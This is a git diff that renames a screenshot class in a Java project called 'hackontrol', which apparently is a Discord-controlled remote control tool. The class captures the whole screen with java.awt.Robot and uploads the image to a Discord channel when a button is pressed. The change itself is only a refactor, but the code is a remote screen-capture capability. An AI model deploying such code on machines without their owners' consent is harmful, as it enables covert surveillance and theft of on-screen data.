@@ -1,4 +1,4 @@
-package com.khopan.hackontrol.channel;
+package com.khopan.hackontrol.module;
 
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -9,7 +9,6 @@ import java.util.Calendar;
 
 import javax.imageio.ImageIO;
 
-import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
@@ -26,8 +25,8 @@ import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.utils.FileUpload;
 import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 
-public class ScreenshotChannel extends HackontrolChannel {
-	private static final String CHANNEL_NAME = "screenshot";
+public class ScreenshotModule extends Module {
+	private static final String MODULE_NAME = "screenshot";
 
 	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonType.SUCCESS, "Screenshot", "screenshot");
 	private static final Button BUTTON_REFRESH    = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",    "screenshotRefresh");
@@ -36,18 +35,18 @@ public class ScreenshotChannel extends HackontrolChannel {
 
 	@Override
 	public String getName() {
-		return ScreenshotChannel.CHANNEL_NAME;
+		return ScreenshotModule.MODULE_NAME;
 	}
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: buttonScreenshot);
-		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotChannel.BUTTON_REFRESH,    this :: buttonRefresh);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotModule.BUTTON_SCREENSHOT, this :: buttonScreenshot);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotModule.BUTTON_REFRESH,    this :: buttonRefresh);
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(ScreenshotChannel.BUTTON_SCREENSHOT)).queue();
+		this.channel.sendMessageComponents(ActionRow.of(ScreenshotModule.BUTTON_SCREENSHOT)).queue();
 	}
 
 	private void buttonScreenshot(ButtonContext context) {
@@ -58,8 +57,8 @@ public class ScreenshotChannel extends HackontrolChannel {
 				}
 
 				MessageCreateBuilder builder = new MessageCreateBuilder();
-				builder.setFiles(ScreenshotChannel.uploadImage(this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "screenshot"));
-				builder.addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, ScreenshotChannel.BUTTON_REFRESH, HackontrolButton.delete());
+				builder.setFiles(ScreenshotModule.uploadImage(this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "screenshot"));
+				builder.addActionRow(ScreenshotModule.BUTTON_SCREENSHOT, ScreenshotModule.BUTTON_REFRESH, HackontrolButton.delete());
 				consumer.accept(builder.build());
 			} catch(Throwable Errors) {
 				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
